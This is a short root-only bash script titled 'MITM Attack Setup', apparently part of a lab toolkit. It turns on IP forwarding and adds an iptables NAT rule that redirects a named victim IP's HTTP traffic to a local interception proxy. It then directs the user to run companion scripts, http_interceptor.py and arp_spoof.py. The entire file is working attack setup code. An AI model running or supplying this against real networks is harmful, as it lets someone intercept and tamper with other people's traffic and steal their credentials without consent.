VICTIM_IP="10.0.101.64"
SERVER_IP="10.0.101.71"
IFACE="eth0"
PROXY_PORT=8080
TARGET_PORT=8000

if [ "$EUID" -ne 0 ]; then
    echo "[!] This script must be run as root (sudo)."
    exit 1
fi

echo "============================================"
echo "  MITM Attack Setup"
echo "============================================"
echo "[*] Victim IP  : $VICTIM_IP"
echo "[*] Server IP  : $SERVER_IP"
echo "[*] Interface  : $IFACE"
echo "============================================"
echo ""

# Enable IP forwarding
echo "[1/2] Enabling IP forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward
echo "      Done."

# Redirect HTTP traffic to our proxy
echo "[2/2] Setting up iptables redirect..."
iptables -t nat -A PREROUTING -p tcp -s "$VICTIM_IP" --dport "$TARGET_PORT" -j REDIRECT --to-port "$PROXY_PORT"
echo "      Traffic from $VICTIM_IP:$TARGET_PORT -> localhost:$PROXY_PORT"

echo ""
echo "============================================"
echo "  Setup complete. Now run in two terminals:"
echo ""
echo "  Terminal 1:  python3 http_interceptor.py"
echo "  Terminal 2:  sudo python3 arp_spoof.py"
echo "============================================"
